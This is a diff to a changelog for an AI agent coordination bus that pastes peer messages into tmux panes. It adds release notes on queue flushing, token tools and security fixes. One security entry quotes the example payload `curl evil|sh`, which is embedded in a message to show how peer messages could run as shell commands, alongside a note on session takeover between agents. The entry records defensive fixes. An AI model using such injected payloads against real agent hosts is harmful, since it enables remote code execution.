@@ -2,14 +2,30 @@
 
 All notable changes to this project will be documented here.
 
-## [0.14.0] — Unreleased
-
-### Changed
-- **Compact injection format (salvaged from v0.8.10, re-applied over the tiered formatter).** The pushers now paste a leaner block: banner `[agent-coord] msgs (pre-consumed, don't re-read):` (routine digest: `[agent-coord] +N routine (pre-consumed, FYI, no reply):`), and each message line is `  [<kind> <HH:MM> <from>] <text>` — the `room ` prefix is stripped from the kind (`room #general` → `#general`), the timestamp is shortened from ISO-8601 to `HH:MM` UTC, and the `from=` label is dropped to a bare id. Applied to both the urgent and routine-digest sections and to **both** delivery paths (`hooks/tier.mjs` `injectLine` and the standalone `scripts/coord-pusher.mjs`), which are locked byte-identical by a source-parity test. The per-message line is the agent parse contract (harnesses read `from`/`room`/`text` back out of it); it stays unambiguously machine-parseable — kind/time/from never contain spaces, so a parser splits on the first `] `. Cuts per-message injection overhead materially on busy panes without losing any field.
+## [0.16.0] — Unreleased
 
 ### Added
 - **Max-age flush for the routine queue.** Routine traffic no longer waits indefinitely for an urgent trigger: once the OLDEST queued message has sat longer than `AGENT_COORD_MAX_QUEUE_MS` (default 300000 = 5min; `0` disables), the pusher flushes the whole backlog as one routine-only digest. Closes the silent-fleet failure mode where `FYI:`/`DONE:`-to-non-gate/chatter queued forever on a quiet bus and delivery looked broken (observed live 2026-07-06: the coordinator's own `FYI:`-prefixed delivery test queued itself). Age is tracked from the oldest entry (`TierQueue.flushOverdue(now)`, clock-free and unit-tested); an urgent drain resets the clock. Zero-loss semantics unchanged — the flush rides the existing confirmed-paste commit path.
-- _(P3 hardening cycle: pusher reaper for wedged pushers, bare-shell pane injection guard, encrypted DMs, message reactions/acks — see docs/BACKLOG.md.)_
+- _(P3 hardening cycle: pusher reaper for wedged pushers, encrypted DMs, message reactions/acks — see docs/BACKLOG.md.)_
+
+## [0.15.0] — 2026-07-06
+
+### Security (Phase 9 node-daemon hardening)
+- **Fail-closed tmux injection policy in the pushers.** Pastes now use bracketed paste, and injection is refused outright when the target pane's foreground command is a bare shell (crashed/exited agent CLI) — previously a peer message with embedded newlines like `"ok\ncurl evil|sh\n"` could execute as shell commands on the receiving machine. Skipped batches redeliver via the at-least-once cursor once the agent CLI is back. (closes #5)
+- **HTTP sessions pinned to their bearer's agent.** An `mcp-session-id` is bound to the agent identity of the bearer token that created it, closing session takeover across tokens. (closes #3)
+- **Fail-closed network gate for non-loopback binds.** Binding beyond loopback now requires explicit opt-in plus token auth, instead of silently exposing the bus. (#8)
+
+### Added
+- **Noise lifecycle: archive-not-delete, scoped prune, membership TTL, message kinds, live compaction.** Aged room/status/inbox traffic is pruned into `archive/` instead of deleted, prune is scoped per channel/agent, inactive room memberships expire on a TTL, and messages carry kinds for lifecycle policy.
+- **`coord-node` — one-command remote node onboarding**, and **`coord-token` — mint/list/revoke per-agent bus tokens** (Phase 9, Task 6 MVP).
+
+### Changed
+- **`src/tools.ts` split into `src/tools/` domain modules** (pure refactor; public tool surface unchanged).
+
+## [0.14.0] — 2026-07-03
+
+### Changed
+- **Compact injection format (salvaged from v0.8.10, re-applied over the tiered formatter).** The pushers now paste a leaner block: banner `[agent-coord] msgs (pre-consumed, don't re-read):` (routine digest: `[agent-coord] +N routine (pre-consumed, FYI, no reply):`), and each message line is `  [<kind> <HH:MM> <from>] <text>` — the `room ` prefix is stripped from the kind (`room #general` → `#general`), the timestamp is shortened from ISO-8601 to `HH:MM` UTC, and the `from=` label is dropped to a bare id. Applied to both the urgent and routine-digest sections and to **both** delivery paths (`hooks/tier.mjs` `injectLine` and the standalone `scripts/coord-pusher.mjs`), which are locked byte-identical by a source-parity test. The per-message line is the agent parse contract (harnesses read `from`/`room`/`text` back out of it); it stays unambiguously machine-parseable — kind/time/from never contain spaces, so a parser splits on the first `] `. Cuts per-message injection overhead materially on busy panes without losing any field.
 
 ## [0.13.0] — 2026-07-03
 
